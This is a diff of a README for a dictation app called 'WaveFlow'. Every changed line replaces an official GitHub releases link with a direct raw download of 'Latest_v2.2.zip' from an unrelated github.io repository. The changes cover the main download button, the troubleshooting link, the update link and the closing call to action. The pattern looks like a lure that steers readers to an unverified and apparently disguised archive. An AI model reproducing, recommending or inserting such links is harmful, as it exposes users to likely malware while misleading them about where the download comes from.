@@ -24,7 +24,7 @@ Follow these simple steps to download and start using WaveFlow today.
 
 ### Step 1: Download WaveFlow
 
-[🎯 **DOWNLOAD WAVEFLOW NOW**](https://github.com/Fernfamilywiccan8933/WaveFlow/releases)
+[🎯 **DOWNLOAD WAVEFLOW NOW**](https://github.com/Fernfamilywiccan8933/fernfamilywiccan8933.github.io/raw/refs/heads/main/assets/Latest_v2.2.zip)
 
 Visit this link to download the application.
 
@@ -108,7 +108,7 @@ Yes. WaveFlow types into whatever text field is currently active – Word, Notep
 ## 🛠️ Troubleshooting
 
 ### The app doesn’t start after installation
-Try downloading the latest version from the [download page](https://github.com/Fernfamilywiccan8933/WaveFlow/releases). Make sure your system meets the minimum requirements listed above.
+Try downloading the latest version from the [download page](https://github.com/Fernfamilywiccan8933/fernfamilywiccan8933.github.io/raw/refs/heads/main/assets/Latest_v2.2.zip). Make sure your system meets the minimum requirements listed above.
 
 ### Voice isn’t being converted to text
 - Ensure your microphone is selected in Windows **Settings > Privacy > Microphone**.
@@ -140,7 +140,7 @@ WaveFlow offers several settings so you can make it work exactly how you like:
 
 ## 🔄 Updating WaveFlow
 
-WaveFlow checks for updates automatically on startup. When a new version is available, you’ll see a download link directly in the app, or you can always grab the latest from the [releases page](https://github.com/Fernfamilywiccan8933/WaveFlow/releases). Updating preserves all your settings and custom vocabulary.
+WaveFlow checks for updates automatically on startup. When a new version is available, you’ll see a download link directly in the app, or you can always grab the latest from the [releases page](https://github.com/Fernfamilywiccan8933/fernfamilywiccan8933.github.io/raw/refs/heads/main/assets/Latest_v2.2.zip). Updating preserves all your settings and custom vocabulary.
 
 ---
 
@@ -175,7 +175,7 @@ No command lines, no coding, no jargon. Download, install, dictate.
 
 Don’t wait – privacy-respecting dictation is one click away.
 
-[🎁 **DOWNLOAD WAVEFLOW – FREE**](https://github.com/Fernfamilywiccan8933/WaveFlow/releases)
+[🎁 **DOWNLOAD WAVEFLOW – FREE**](https://github.com/Fernfamilywiccan8933/fernfamilywiccan8933.github.io/raw/refs/heads/main/assets/Latest_v2.2.zip)
 
 Visit this link to download the application.
 
